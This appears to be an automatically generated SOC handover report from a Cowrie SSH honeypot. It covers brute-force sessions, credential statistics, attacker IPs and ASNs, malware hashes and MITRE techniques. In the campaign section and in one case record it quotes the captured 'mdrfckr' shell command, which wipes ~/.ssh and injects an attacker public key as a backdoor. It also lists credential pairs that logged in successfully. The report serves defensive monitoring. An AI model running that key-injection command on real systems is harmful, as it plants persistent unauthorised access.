# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-26 |
| **Generated At** | 2026-03-26T20:34:26Z |
| **Shift Time** | 20:34 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **23** |
| Confirmed Threats | **17** |
| False Positives Filtered | **6** (26.1%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **14** |
| High Severity Cases | **2** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **21** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **18** |
| Unique Credential Pairs | **17** |
| Unique Usernames | **13** |
| Unique Passwords | **16** |
| Successful Auth Pairs | **2** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 2 |
| `admin` | 2 |
| `Unknown` | 2 |
| `default` | 2 |
| `ubnt` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `121212` | 2 |
| `66666` | 2 |
| `abc@123..` | 1 |
| `345gs5662d34` | 1 |
| `3245gs5662d34` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `default` | `66666` | 2 |
| `root` | `abc@123..` | 1 |
| `345gs5662d34` | `345gs5662d34` | 1 |
| `root` | `3245gs5662d34` | 1 |
| `admin` | `7777777` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `abc@123..` | `102.208.34.7` | 2026-03-26T19:02:58 |
| `root` | `3245gs5662d34` | `102.208.34.7` | 2026-03-26T19:03:05 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `102.208.34.7`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **21** |
| Unique ASNs | **20** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | HIGH |
| `AS38121` | LG HelloVision Corp. | 1 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 1 | HIGH |
| `AS10620` | Telmex Colombia S.A. | 1 | HIGH |
| `AS19108` | Optimum | 1 | MEDIUM |
| `AS205254` | Valeen for General trading, Internet Services and Information Technology / Ltd | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (2)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6724d643a193

| Field | Detail |
|---|---|
| **Source IP** | `102.208.34[.]7` |
| **First Seen** | 2026-03-26 19:02 |
| **Last Seen** | 2026-03-26 19:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 19:02:56` | `cowrie.session.connect` |
| `2026-03-26 19:02:56` | `cowrie.client.version` |
| `2026-03-26 19:02:56` | `cowrie.client.kex` |
| `2026-03-26 19:02:58` | `cowrie.login.success` |
| `2026-03-26 19:02:58` | `cowrie.session.params` |
| `2026-03-26 19:02:58` | `cowrie.command.input` |
| `2026-03-26 19:02:58` | `cowrie.command.failed` |
| `2026-03-26 19:02:59` | `cowrie.log.closed` |
| `2026-03-26 19:02:59` | `cowrie.session.params` |
| `2026-03-26 19:02:59` | `cowrie.command.input` |
| `2026-03-26 19:03:00` | `cowrie.session.file_download` |
| `2026-03-26 19:03:00` | `cowrie.log.closed` |
| `2026-03-26 19:03:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.208.34[.]7` to AbuseIPDB if not already reported
- [ ] Block `102.208.34[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbe6e9bc2a36

| Field | Detail |
|---|---|
| **Source IP** | `102.208.34[.]7` |
| **First Seen** | 2026-03-26 19:03 |
| **Last Seen** | 2026-03-26 19:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 19:03:04` | `cowrie.session.connect` |
| `2026-03-26 19:03:04` | `cowrie.client.version` |
| `2026-03-26 19:03:04` | `cowrie.client.kex` |
| `2026-03-26 19:03:05` | `cowrie.login.success` |
| `2026-03-26 19:03:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.208.34[.]7` to AbuseIPDB if not already reported
- [ ] Block `102.208.34[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.201.104[.]216` | 1 | 2026-03-26 19:48 | 2026-03-26 19:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `102.208.34[.]7` | 1 | 2026-03-26 19:03 | 2026-03-26 19:03 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.32[.]5` | 1 | 2026-03-26 19:07 | 2026-03-26 19:07 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.30.180[.]58` | 1 | 2026-03-26 19:46 | 2026-03-26 19:46 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.186.18[.]3` | 1 | 2026-03-26 19:25 | 2026-03-26 19:25 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `123.209.117[.]90` | 1 | 2026-03-26 20:24 | 2026-03-26 20:25 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.229.212[.]165` | 1 | 2026-03-26 19:36 | 2026-03-26 19:37 | 14s | 0 | `T1592` | 🟢 LOW |
| `128.185.220[.]90` | 1 | 2026-03-26 19:26 | 2026-03-26 19:26 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.94.74[.]94` | 1 | 2026-03-26 20:05 | 2026-03-26 20:06 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `181.58.70[.]69` | 1 | 2026-03-26 19:47 | 2026-03-26 19:47 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.255.47[.]190` | 1 | 2026-03-26 20:26 | 2026-03-26 20:26 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.146.217[.]105` | 1 | 2026-03-26 20:29 | 2026-03-26 20:29 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.233[.]110` | 1 | 2026-03-26 20:06 | 2026-03-26 20:06 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `74.244.185[.]252` | 1 | 2026-03-26 20:27 | 2026-03-26 20:29 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.62.243[.]175` | 1 | 2026-03-26 19:45 | 2026-03-26 19:45 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `74.244.185[.]252` | BR | SpaceX Services, Inc. | **100** ⚠️ | 2 |
| `122.186.18[.]3` | IN | BHARTI TELENET LTD. NEW DELHI | **100** ⚠️ | 9 |
| `34.146.217[.]105` | JP | Google LLC | **100** ⚠️ | 50 |
| `181.58.70[.]69` | CO | Telmex Colombia S.A. | **100** ⚠️ | 1 |
| `128.185.220[.]90` | IN | BHARTI-AIRTEL | **100** ⚠️ | 15 |
| `180.94.74[.]94` | AF | GCN/DCN Networks | **100** ⚠️ | 23 |
| `111.70.32[.]5` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 29 |
| `123.209.117[.]90` | AU | Telstra Limited | **100** ⚠️ | 7 |
| `114.30.180[.]58` | KR | HVHonam | **100** ⚠️ | 38 |
| `92.62.243[.]175` | BG | MyAcct LTD | **100** ⚠️ | 24 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 18 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 16 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 2 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 23 cases |
| Tool 34  | Credential Extractor        | ✅ 18 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 21 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (26.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 2 priority case(s) shown individually · 15 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-26T20:34:26Z_
